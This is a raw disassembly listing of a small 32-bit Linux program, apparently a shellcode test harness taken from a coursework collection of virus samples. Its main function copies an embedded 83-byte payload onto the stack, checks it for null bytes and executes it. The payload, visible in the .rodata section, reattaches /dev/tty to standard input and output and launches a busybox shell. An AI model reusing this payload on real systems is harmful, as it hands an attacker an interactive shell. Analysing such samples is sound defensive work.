
/home/stas/Coursach/Выборки/compiled/viruses/13321:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 4f 87             	add    %cl,-0x79(%edi)
 804819a:	73 cd                	jae    8048169 <_init-0x1cf>
 804819c:	10 15 93 9f 22 72    	adc    %dl,0x72229f93
 80481a2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 80481a3:	22 2d 68 4d d4 51    	and    0x51d44d68,%ch
 80481a9:	b1 b8                	mov    $0xb8,%cl
 80481ab:	f7                   	.byte 0xf7

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	07                   	pop    %es
 80481b1:	00 00                	add    %al,(%eax)
 80481b3:	00 01                	add    %al,(%ecx)
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 07                	add    %al,(%edi)
 80481c5:	00 00                	add    %al,(%eax)
 80481c7:	00                   	.byte 0x0
 80481c8:	ad                   	lods   %ds:(%esi),%eax
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x1ac>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	30 00                	xor    %al,(%eax)
	...
 80481e6:	00 00                	add    %al,(%eax)
 80481e8:	12 00                	adc    (%eax),%al
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	1f                   	pop    %ds
	...
 80481f5:	00 00                	add    %al,(%eax)
 80481f7:	00 12                	add    %dl,(%edx)
 80481f9:	00 00                	add    %al,(%eax)
 80481fb:	00 1a                	add    %bl,(%edx)
	...
 8048205:	00 00                	add    %al,(%eax)
 8048207:	00 12                	add    %dl,(%edx)
 8048209:	00 00                	add    %al,(%eax)
 804820b:	00 50 00             	add    %dl,0x0(%eax)
	...
 8048216:	00 00                	add    %al,(%eax)
 8048218:	20 00                	and    %al,(%eax)
 804821a:	00 00                	add    %al,(%eax)
 804821c:	3e 00 00             	add    %al,%ds:(%eax)
	...
 8048227:	00 12                	add    %dl,(%edx)
 8048229:	00 00                	add    %al,(%eax)
 804822b:	00 37                	add    %dh,(%edi)
	...
 8048235:	00 00                	add    %al,(%eax)
 8048237:	00 12                	add    %dl,(%edx)
 8048239:	00 00                	add    %al,(%eax)
 804823b:	00 0b                	add    %cl,(%ebx)
 804823d:	00 00                	add    %al,(%eax)
 804823f:	00 6c 86 04          	add    %ch,0x4(%esi,%eax,4)
 8048243:	08 04 00             	or     %al,(%eax,%eax,1)
 8048246:	00 00                	add    %al,(%eax)
 8048248:	11 00                	adc    %eax,(%eax)
 804824a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804824c <.dynstr>:
 804824c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048250:	63 2e                	arpl   %bp,(%esi)
 8048252:	73 6f                	jae    80482c3 <_init-0x75>
 8048254:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048259:	4f                   	dec    %edi
 804825a:	5f                   	pop    %edi
 804825b:	73 74                	jae    80482d1 <_init-0x67>
 804825d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048264:	64 
 8048265:	00 70 75             	add    %dh,0x75(%eax)
 8048268:	74 73                	je     80482dd <_init-0x5b>
 804826a:	00 5f 5f             	add    %bl,0x5f(%edi)
 804826d:	73 74                	jae    80482e3 <_init-0x55>
 804826f:	61                   	popa   
 8048270:	63 6b 5f             	arpl   %bp,0x5f(%ebx)
 8048273:	63 68 6b             	arpl   %bp,0x6b(%eax)
 8048276:	5f                   	pop    %edi
 8048277:	66 61                	popaw  
 8048279:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%eax,%eax,1),%ebp
 8048280:	74 
 8048281:	66                   	data16
 8048282:	00 6d 65             	add    %ch,0x65(%ebp)
 8048285:	6d                   	insl   (%dx),%es:(%edi)
 8048286:	6d                   	insl   (%dx),%es:(%edi)
 8048287:	65                   	gs
 8048288:	6d                   	insl   (%dx),%es:(%edi)
 8048289:	00 5f 5f             	add    %bl,0x5f(%edi)
 804828c:	6c                   	insb   (%dx),%es:(%edi)
 804828d:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 8048294:	72 74                	jb     804830a <_init-0x2e>
 8048296:	5f                   	pop    %edi
 8048297:	6d                   	insl   (%dx),%es:(%edi)
 8048298:	61                   	popa   
 8048299:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 80482a0:	6f                   	outsl  %ds:(%esi),(%dx)
 80482a1:	6e                   	outsb  %ds:(%esi),(%dx)
 80482a2:	5f                   	pop    %edi
 80482a3:	73 74                	jae    8048319 <_init-0x1f>
 80482a5:	61                   	popa   
 80482a6:	72 74                	jb     804831c <_init-0x1c>
 80482a8:	5f                   	pop    %edi
 80482a9:	5f                   	pop    %edi
 80482aa:	00 47 4c             	add    %al,0x4c(%edi)
 80482ad:	49                   	dec    %ecx
 80482ae:	42                   	inc    %edx
 80482af:	43                   	inc    %ebx
 80482b0:	5f                   	pop    %edi
 80482b1:	32 2e                	xor    (%esi),%ch
 80482b3:	34 00                	xor    $0x0,%al
 80482b5:	47                   	inc    %edi
 80482b6:	4c                   	dec    %esp
 80482b7:	49                   	dec    %ecx
 80482b8:	42                   	inc    %edx
 80482b9:	43                   	inc    %ebx
 80482ba:	5f                   	pop    %edi
 80482bb:	32 2e                	xor    (%esi),%ch
 80482bd:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

080482c0 <.gnu.version>:
 80482c0:	00 00                	add    %al,(%eax)
 80482c2:	02 00                	add    (%eax),%al
 80482c4:	03 00                	add    (%eax),%eax
 80482c6:	02 00                	add    (%eax),%al
 80482c8:	00 00                	add    %al,(%eax)
 80482ca:	02 00                	add    (%eax),%al
 80482cc:	02 00                	add    (%eax),%al
 80482ce:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

080482d0 <.gnu.version_r>:
 80482d0:	01 00                	add    %eax,(%eax)
 80482d2:	02 00                	add    (%eax),%al
 80482d4:	01 00                	add    %eax,(%eax)
 80482d6:	00 00                	add    %al,(%eax)
 80482d8:	10 00                	adc    %al,(%eax)
 80482da:	00 00                	add    %al,(%eax)
 80482dc:	00 00                	add    %al,(%eax)
 80482de:	00 00                	add    %al,(%eax)
 80482e0:	14 69                	adc    $0x69,%al
 80482e2:	69 0d 00 00 03 00 5f 	imul   $0x5f,0x30000,%ecx
 80482e9:	00 00 00 
 80482ec:	10 00                	adc    %al,(%eax)
 80482ee:	00 00                	add    %al,(%eax)
 80482f0:	10 69 69             	adc    %ch,0x69(%ecx)
 80482f3:	0d 00 00 02 00       	or     $0x20000,%eax
 80482f8:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
	...

Дизассемблирование раздела .rel.dyn:

08048300 <.rel.dyn>:
 8048300:	fc                   	cld    
 8048301:	9f                   	lahf   
 8048302:	04 08                	add    $0x8,%al
 8048304:	06                   	push   %es
 8048305:	04 00                	add    $0x0,%al
	...

Дизассемблирование раздела .rel.plt:

08048308 <.rel.plt>:
 8048308:	0c a0                	or     $0xa0,%al
 804830a:	04 08                	add    $0x8,%al
 804830c:	07                   	pop    %es
 804830d:	01 00                	add    %eax,(%eax)
 804830f:	00 10                	add    %dl,(%eax)
 8048311:	a0 04 08 07 02       	mov    0x2070804,%al
 8048316:	00 00                	add    %al,(%eax)
 8048318:	14 a0                	adc    $0xa0,%al
 804831a:	04 08                	add    $0x8,%al
 804831c:	07                   	pop    %es
 804831d:	03 00                	add    (%eax),%eax
 804831f:	00 18                	add    %bl,(%eax)
 8048321:	a0 04 08 07 04       	mov    0x4070804,%al
 8048326:	00 00                	add    %al,(%eax)
 8048328:	1c a0                	sbb    $0xa0,%al
 804832a:	04 08                	add    $0x8,%al
 804832c:	07                   	pop    %es
 804832d:	05 00 00 20 a0       	add    $0xa0200000,%eax
 8048332:	04 08                	add    $0x8,%al
 8048334:	07                   	pop    %es
 8048335:	06                   	push   %es
	...

Дизассемблирование раздела .init:

08048338 <_init>:
 8048338:	53                   	push   %ebx
 8048339:	83 ec 08             	sub    $0x8,%esp
 804833c:	e8 bf 00 00 00       	call   8048400 <__x86.get_pc_thunk.bx>
 8048341:	81 c3 bf 1c 00 00    	add    $0x1cbf,%ebx
 8048347:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 804834d:	85 c0                	test   %eax,%eax
 804834f:	74 05                	je     8048356 <_init+0x1e>
 8048351:	e8 4a 00 00 00       	call   80483a0 <__gmon_start__@plt>
 8048356:	83 c4 08             	add    $0x8,%esp
 8048359:	5b                   	pop    %ebx
 804835a:	c3                   	ret    

Дизассемблирование раздела .plt:

08048360 <printf@plt-0x10>:
 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804836c:	00 00                	add    %al,(%eax)
	...

08048370 <printf@plt>:
 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048376:	68 00 00 00 00       	push   $0x0
 804837b:	e9 e0 ff ff ff       	jmp    8048360 <_init+0x28>

08048380 <__stack_chk_fail@plt>:
 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048386:	68 08 00 00 00       	push   $0x8
 804838b:	e9 d0 ff ff ff       	jmp    8048360 <_init+0x28>

08048390 <puts@plt>:
 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048396:	68 10 00 00 00       	push   $0x10
 804839b:	e9 c0 ff ff ff       	jmp    8048360 <_init+0x28>

080483a0 <__gmon_start__@plt>:
 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018
 80483a6:	68 18 00 00 00       	push   $0x18
 80483ab:	e9 b0 ff ff ff       	jmp    8048360 <_init+0x28>

080483b0 <__libc_start_main@plt>:
 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 80483b6:	68 20 00 00 00       	push   $0x20
 80483bb:	e9 a0 ff ff ff       	jmp    8048360 <_init+0x28>

080483c0 <memmem@plt>:
 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020
 80483c6:	68 28 00 00 00       	push   $0x28
 80483cb:	e9 90 ff ff ff       	jmp    8048360 <_init+0x28>

Дизассемблирование раздела .text:

080483d0 <_start>:
 80483d0:	31 ed                	xor    %ebp,%ebp
 80483d2:	5e                   	pop    %esi
 80483d3:	89 e1                	mov    %esp,%ecx
 80483d5:	83 e4 f0             	and    $0xfffffff0,%esp
 80483d8:	50                   	push   %eax
 80483d9:	54                   	push   %esp
 80483da:	52                   	push   %edx
 80483db:	68 50 86 04 08       	push   $0x8048650
 80483e0:	68 e0 85 04 08       	push   $0x80485e0
 80483e5:	51                   	push   %ecx
 80483e6:	56                   	push   %esi
 80483e7:	68 cd 84 04 08       	push   $0x80484cd
 80483ec:	e8 bf ff ff ff       	call   80483b0 <__libc_start_main@plt>
 80483f1:	f4                   	hlt    
 80483f2:	66 90                	xchg   %ax,%ax
 80483f4:	66 90                	xchg   %ax,%ax
 80483f6:	66 90                	xchg   %ax,%ax
 80483f8:	66 90                	xchg   %ax,%ax
 80483fa:	66 90                	xchg   %ax,%ax
 80483fc:	66 90                	xchg   %ax,%ax
 80483fe:	66 90                	xchg   %ax,%ax

08048400 <__x86.get_pc_thunk.bx>:
 8048400:	8b 1c 24             	mov    (%esp),%ebx
 8048403:	c3                   	ret    
 8048404:	66 90                	xchg   %ax,%ax
 8048406:	66 90                	xchg   %ax,%ax
 8048408:	66 90                	xchg   %ax,%ax
 804840a:	66 90                	xchg   %ax,%ax
 804840c:	66 90                	xchg   %ax,%ax
 804840e:	66 90                	xchg   %ax,%ax

08048410 <deregister_tm_clones>:
 8048410:	b8 2f a0 04 08       	mov    $0x804a02f,%eax
 8048415:	2d 2c a0 04 08       	sub    $0x804a02c,%eax
 804841a:	83 f8 06             	cmp    $0x6,%eax
 804841d:	77 01                	ja     8048420 <deregister_tm_clones+0x10>
 804841f:	c3                   	ret    
 8048420:	b8 00 00 00 00       	mov    $0x0,%eax
 8048425:	85 c0                	test   %eax,%eax
 8048427:	74 f6                	je     804841f <deregister_tm_clones+0xf>
 8048429:	55                   	push   %ebp
 804842a:	89 e5                	mov    %esp,%ebp
 804842c:	83 ec 18             	sub    $0x18,%esp
 804842f:	c7 04 24 2c a0 04 08 	movl   $0x804a02c,(%esp)
 8048436:	ff d0                	call   *%eax
 8048438:	c9                   	leave  
 8048439:	c3                   	ret    
 804843a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048440 <register_tm_clones>:
 8048440:	b8 2c a0 04 08       	mov    $0x804a02c,%eax
 8048445:	2d 2c a0 04 08       	sub    $0x804a02c,%eax
 804844a:	c1 f8 02             	sar    $0x2,%eax
 804844d:	89 c2                	mov    %eax,%edx
 804844f:	c1 ea 1f             	shr    $0x1f,%edx
 8048452:	01 d0                	add    %edx,%eax
 8048454:	d1 f8                	sar    %eax
 8048456:	75 01                	jne    8048459 <register_tm_clones+0x19>
 8048458:	c3                   	ret    
 8048459:	ba 00 00 00 00       	mov    $0x0,%edx
 804845e:	85 d2                	test   %edx,%edx
 8048460:	74 f6                	je     8048458 <register_tm_clones+0x18>
 8048462:	55                   	push   %ebp
 8048463:	89 e5                	mov    %esp,%ebp
 8048465:	83 ec 18             	sub    $0x18,%esp
 8048468:	89 44 24 04          	mov    %eax,0x4(%esp)
 804846c:	c7 04 24 2c a0 04 08 	movl   $0x804a02c,(%esp)
 8048473:	ff d2                	call   *%edx
 8048475:	c9                   	leave  
 8048476:	c3                   	ret    
 8048477:	89 f6                	mov    %esi,%esi
 8048479:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048480 <__do_global_dtors_aux>:
 8048480:	80 3d 2c a0 04 08 00 	cmpb   $0x0,0x804a02c
 8048487:	75 13                	jne    804849c <__do_global_dtors_aux+0x1c>
 8048489:	55                   	push   %ebp
 804848a:	89 e5                	mov    %esp,%ebp
 804848c:	83 ec 08             	sub    $0x8,%esp
 804848f:	e8 7c ff ff ff       	call   8048410 <deregister_tm_clones>
 8048494:	c6 05 2c a0 04 08 01 	movb   $0x1,0x804a02c
 804849b:	c9                   	leave  
 804849c:	f3 c3                	repz ret 
 804849e:	66 90                	xchg   %ax,%ax

080484a0 <frame_dummy>:
 80484a0:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 80484a5:	85 c0                	test   %eax,%eax
 80484a7:	74 1f                	je     80484c8 <frame_dummy+0x28>
 80484a9:	b8 00 00 00 00       	mov    $0x0,%eax
 80484ae:	85 c0                	test   %eax,%eax
 80484b0:	74 16                	je     80484c8 <frame_dummy+0x28>
 80484b2:	55                   	push   %ebp
 80484b3:	89 e5                	mov    %esp,%ebp
 80484b5:	83 ec 18             	sub    $0x18,%esp
 80484b8:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 80484bf:	ff d0                	call   *%eax
 80484c1:	c9                   	leave  
 80484c2:	e9 79 ff ff ff       	jmp    8048440 <register_tm_clones>
 80484c7:	90                   	nop
 80484c8:	e9 73 ff ff ff       	jmp    8048440 <register_tm_clones>

080484cd <main>:
 80484cd:	55                   	push   %ebp
 80484ce:	89 e5                	mov    %esp,%ebp
 80484d0:	57                   	push   %edi
 80484d1:	56                   	push   %esi
 80484d2:	53                   	push   %ebx
 80484d3:	83 e4 f0             	and    $0xfffffff0,%esp
 80484d6:	83 ec 70             	sub    $0x70,%esp
 80484d9:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 80484df:	89 44 24 6c          	mov    %eax,0x6c(%esp)
 80484e3:	31 c0                	xor    %eax,%eax
 80484e5:	8d 44 24 19          	lea    0x19(%esp),%eax
 80484e9:	ba 9c 86 04 08       	mov    $0x804869c,%edx
 80484ee:	bb 53 00 00 00       	mov    $0x53,%ebx
 80484f3:	89 c1                	mov    %eax,%ecx
 80484f5:	83 e1 01             	and    $0x1,%ecx
 80484f8:	85 c9                	test   %ecx,%ecx
 80484fa:	74 0e                	je     804850a <main+0x3d>
 80484fc:	0f b6 0a             	movzbl (%edx),%ecx
 80484ff:	88 08                	mov    %cl,(%eax)
 8048501:	83 c0 01             	add    $0x1,%eax
 8048504:	83 c2 01             	add    $0x1,%edx
 8048507:	83 eb 01             	sub    $0x1,%ebx
 804850a:	89 c1                	mov    %eax,%ecx
 804850c:	83 e1 02             	and    $0x2,%ecx
 804850f:	85 c9                	test   %ecx,%ecx
 8048511:	74 0f                	je     8048522 <main+0x55>
 8048513:	0f b7 0a             	movzwl (%edx),%ecx
 8048516:	66 89 08             	mov    %cx,(%eax)
 8048519:	83 c0 02             	add    $0x2,%eax
 804851c:	83 c2 02             	add    $0x2,%edx
 804851f:	83 eb 02             	sub    $0x2,%ebx
 8048522:	89 d9                	mov    %ebx,%ecx
 8048524:	c1 e9 02             	shr    $0x2,%ecx
 8048527:	89 c7                	mov    %eax,%edi
 8048529:	89 d6                	mov    %edx,%esi
 804852b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 804852d:	89 f2                	mov    %esi,%edx
 804852f:	89 f8                	mov    %edi,%eax
 8048531:	b9 00 00 00 00       	mov    $0x0,%ecx
 8048536:	89 de                	mov    %ebx,%esi
 8048538:	83 e6 02             	and    $0x2,%esi
 804853b:	85 f6                	test   %esi,%esi
 804853d:	74 0b                	je     804854a <main+0x7d>
 804853f:	0f b7 34 0a          	movzwl (%edx,%ecx,1),%esi
 8048543:	66 89 34 08          	mov    %si,(%eax,%ecx,1)
 8048547:	83 c1 02             	add    $0x2,%ecx
 804854a:	83 e3 01             	and    $0x1,%ebx
 804854d:	85 db                	test   %ebx,%ebx
 804854f:	74 07                	je     8048558 <main+0x8b>
 8048551:	0f b6 14 0a          	movzbl (%edx,%ecx,1),%edx
 8048555:	88 14 08             	mov    %dl,(%eax,%ecx,1)
 8048558:	c6 44 24 18 00       	movb   $0x0,0x18(%esp)
 804855d:	c7 44 24 04 53 00 00 	movl   $0x53,0x4(%esp)
 8048564:	00 
 8048565:	c7 04 24 70 86 04 08 	movl   $0x8048670,(%esp)
 804856c:	e8 ff fd ff ff       	call   8048370 <printf@plt>
 8048571:	c7 04 24 84 86 04 08 	movl   $0x8048684,(%esp)
 8048578:	e8 f3 fd ff ff       	call   8048370 <printf@plt>
 804857d:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
 8048584:	00 
 8048585:	8d 44 24 18          	lea    0x18(%esp),%eax
 8048589:	89 44 24 08          	mov    %eax,0x8(%esp)
 804858d:	c7 44 24 04 53 00 00 	movl   $0x53,0x4(%esp)
 8048594:	00 
 8048595:	8d 44 24 19          	lea    0x19(%esp),%eax
 8048599:	89 04 24             	mov    %eax,(%esp)
 804859c:	e8 1f fe ff ff       	call   80483c0 <memmem@plt>
 80485a1:	85 c0                	test   %eax,%eax
 80485a3:	75 0e                	jne    80485b3 <main+0xe6>
 80485a5:	c7 04 24 95 86 04 08 	movl   $0x8048695,(%esp)
 80485ac:	e8 df fd ff ff       	call   8048390 <puts@plt>
 80485b1:	eb 0c                	jmp    80485bf <main+0xf2>
 80485b3:	c7 04 24 99 86 04 08 	movl   $0x8048699,(%esp)
 80485ba:	e8 d1 fd ff ff       	call   8048390 <puts@plt>
 80485bf:	8d 44 24 19          	lea    0x19(%esp),%eax
 80485c3:	ff d0                	call   *%eax
 80485c5:	8b 7c 24 6c          	mov    0x6c(%esp),%edi
 80485c9:	65 33 3d 14 00 00 00 	xor    %gs:0x14,%edi
 80485d0:	74 05                	je     80485d7 <main+0x10a>
 80485d2:	e8 a9 fd ff ff       	call   8048380 <__stack_chk_fail@plt>
 80485d7:	8d 65 f4             	lea    -0xc(%ebp),%esp
 80485da:	5b                   	pop    %ebx
 80485db:	5e                   	pop    %esi
 80485dc:	5f                   	pop    %edi
 80485dd:	5d                   	pop    %ebp
 80485de:	c3                   	ret    
 80485df:	90                   	nop

080485e0 <__libc_csu_init>:
 80485e0:	55                   	push   %ebp
 80485e1:	57                   	push   %edi
 80485e2:	31 ff                	xor    %edi,%edi
 80485e4:	56                   	push   %esi
 80485e5:	53                   	push   %ebx
 80485e6:	e8 15 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 80485eb:	81 c3 15 1a 00 00    	add    $0x1a15,%ebx
 80485f1:	83 ec 1c             	sub    $0x1c,%esp
 80485f4:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 80485f8:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 80485fe:	e8 35 fd ff ff       	call   8048338 <_init>
 8048603:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 8048609:	29 c6                	sub    %eax,%esi
 804860b:	c1 fe 02             	sar    $0x2,%esi
 804860e:	85 f6                	test   %esi,%esi
 8048610:	74 27                	je     8048639 <__libc_csu_init+0x59>
 8048612:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048618:	8b 44 24 38          	mov    0x38(%esp),%eax
 804861c:	89 2c 24             	mov    %ebp,(%esp)
 804861f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048623:	8b 44 24 34          	mov    0x34(%esp),%eax
 8048627:	89 44 24 04          	mov    %eax,0x4(%esp)
 804862b:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 8048632:	83 c7 01             	add    $0x1,%edi
 8048635:	39 f7                	cmp    %esi,%edi
 8048637:	75 df                	jne    8048618 <__libc_csu_init+0x38>
 8048639:	83 c4 1c             	add    $0x1c,%esp
 804863c:	5b                   	pop    %ebx
 804863d:	5e                   	pop    %esi
 804863e:	5f                   	pop    %edi
 804863f:	5d                   	pop    %ebp
 8048640:	c3                   	ret    
 8048641:	eb 0d                	jmp    8048650 <__libc_csu_fini>
 8048643:	90                   	nop
 8048644:	90                   	nop
 8048645:	90                   	nop
 8048646:	90                   	nop
 8048647:	90                   	nop
 8048648:	90                   	nop
 8048649:	90                   	nop
 804864a:	90                   	nop
 804864b:	90                   	nop
 804864c:	90                   	nop
 804864d:	90                   	nop
 804864e:	90                   	nop
 804864f:	90                   	nop

08048650 <__libc_csu_fini>:
 8048650:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

08048654 <_fini>:
 8048654:	53                   	push   %ebx
 8048655:	83 ec 08             	sub    $0x8,%esp
 8048658:	e8 a3 fd ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 804865d:	81 c3 a3 19 00 00    	add    $0x19a3,%ebx
 8048663:	83 c4 08             	add    $0x8,%esp
 8048666:	5b                   	pop    %ebx
 8048667:	c3                   	ret    

Дизассемблирование раздела .rodata:

08048668 <_fp_hw>:
 8048668:	03 00                	add    (%eax),%eax
	...

0804866c <_IO_stdin_used>:
 804866c:	01 00                	add    %eax,(%eax)
 804866e:	02 00                	add    (%eax),%al
 8048670:	73 68                	jae    80486da <_IO_stdin_used+0x6e>
 8048672:	65                   	gs
 8048673:	6c                   	insb   (%dx),%es:(%edi)
 8048674:	6c                   	insb   (%dx),%es:(%edi)
 8048675:	63 6f 64             	arpl   %bp,0x64(%edi)
 8048678:	65                   	gs
 8048679:	5f                   	pop    %edi
 804867a:	73 69                	jae    80486e5 <_IO_stdin_used+0x79>
 804867c:	7a 65                	jp     80486e3 <_IO_stdin_used+0x77>
 804867e:	3a 20                	cmp    (%eax),%ah
 8048680:	25 75 0a 00 63       	and    $0x63000a75,%eax
 8048685:	6f                   	outsl  %ds:(%esi),(%dx)
 8048686:	6e                   	outsb  %ds:(%esi),(%dx)
 8048687:	74 61                	je     80486ea <_IO_stdin_used+0x7e>
 8048689:	69 6e 73 20 6e 75 6c 	imul   $0x6c756e20,0x73(%esi),%ebp
 8048690:	6c                   	insb   (%dx),%es:(%edi)
 8048691:	73 3a                	jae    80486cd <_IO_stdin_used+0x61>
 8048693:	20 00                	and    %al,(%eax)
 8048695:	79 65                	jns    80486fc <_IO_stdin_used+0x90>
 8048697:	73 00                	jae    8048699 <_IO_stdin_used+0x2d>
 8048699:	6e                   	outsb  %ds:(%esi),(%dx)
 804869a:	6f                   	outsl  %ds:(%esi),(%dx)
 804869b:	00 31                	add    %dh,(%ecx)
 804869d:	d2                   	(bad)  
 804869e:	31 c0                	xor    %eax,%eax
 80486a0:	6a 02                	push   $0x2
 80486a2:	59                   	pop    %ecx
 80486a3:	66 b8 53 30          	mov    $0x3053,%ax
 80486a7:	50                   	push   %eax
 80486a8:	68 2f 74 74 79       	push   $0x7974742f
 80486ad:	68 2f 64 65 76       	push   $0x7665642f
 80486b2:	89 e3                	mov    %esp,%ebx
 80486b4:	6a 05                	push   $0x5
 80486b6:	58                   	pop    %eax
 80486b7:	89 c6                	mov    %eax,%esi
 80486b9:	cd 80                	int    $0x80
 80486bb:	89 c6                	mov    %eax,%esi
 80486bd:	31 c9                	xor    %ecx,%ecx
 80486bf:	89 f3                	mov    %esi,%ebx
 80486c1:	6a 3f                	push   $0x3f
 80486c3:	58                   	pop    %eax
 80486c4:	cd 80                	int    $0x80
 80486c6:	41                   	inc    %ecx
 80486c7:	80 f9 03             	cmp    $0x3,%cl
 80486ca:	75 f3                	jne    80486bf <_IO_stdin_used+0x53>
 80486cc:	66 b8 73 68          	mov    $0x6873,%ax
 80486d0:	50                   	push   %eax
 80486d1:	89 e1                	mov    %esp,%ecx
 80486d3:	52                   	push   %edx
 80486d4:	51                   	push   %ecx
 80486d5:	89 e1                	mov    %esp,%ecx
 80486d7:	52                   	push   %edx
 80486d8:	68 79 62 6f 78       	push   $0x786f6279
 80486dd:	68 2f 62 75 73       	push   $0x7375622f
 80486e2:	68 2f 62 69 6e       	push   $0x6e69622f
 80486e7:	89 e3                	mov    %esp,%ebx
 80486e9:	6a 0b                	push   $0xb
 80486eb:	58                   	pop    %eax
 80486ec:	cd 80                	int    $0x80
	...

Дизассемблирование раздела .eh_frame_hdr:

080486f0 <.eh_frame_hdr>:
 80486f0:	01 1b                	add    %ebx,(%ebx)
 80486f2:	03 3b                	add    (%ebx),%edi
 80486f4:	28 00                	sub    %al,(%eax)
 80486f6:	00 00                	add    %al,(%eax)
 80486f8:	04 00                	add    $0x0,%al
 80486fa:	00 00                	add    %al,(%eax)
 80486fc:	70 fc                	jo     80486fa <_IO_stdin_used+0x8e>
 80486fe:	ff                   	(bad)  
 80486ff:	ff 44 00 00          	incl   0x0(%eax,%eax,1)
 8048703:	00 dd                	add    %bl,%ch
 8048705:	fd                   	std    
 8048706:	ff                   	(bad)  
 8048707:	ff 68 00             	ljmp   *0x0(%eax)
 804870a:	00 00                	add    %al,(%eax)
 804870c:	f0 fe                	lock (bad) 
 804870e:	ff                   	(bad)  
 804870f:	ff 98 00 00 00 60    	lcall  *0x60000000(%eax)
 8048715:	ff                   	(bad)  
 8048716:	ff                   	(bad)  
 8048717:	ff d4                	call   *%esp
 8048719:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

0804871c <__FRAME_END__-0xbc>:
 804871c:	14 00                	adc    $0x0,%al
 804871e:	00 00                	add    %al,(%eax)
 8048720:	00 00                	add    %al,(%eax)
 8048722:	00 00                	add    %al,(%eax)
 8048724:	01 7a 52             	add    %edi,0x52(%edx)
 8048727:	00 01                	add    %al,(%ecx)
 8048729:	7c 08                	jl     8048733 <_IO_stdin_used+0xc7>
 804872b:	01 1b                	add    %ebx,(%ebx)
 804872d:	0c 04                	or     $0x4,%al
 804872f:	04 88                	add    $0x88,%al
 8048731:	01 00                	add    %eax,(%eax)
 8048733:	00 20                	add    %ah,(%eax)
 8048735:	00 00                	add    %al,(%eax)
 8048737:	00 1c 00             	add    %bl,(%eax,%eax,1)
 804873a:	00 00                	add    %al,(%eax)
 804873c:	24 fc                	and    $0xfc,%al
 804873e:	ff                   	(bad)  
 804873f:	ff 70 00             	pushl  0x0(%eax)
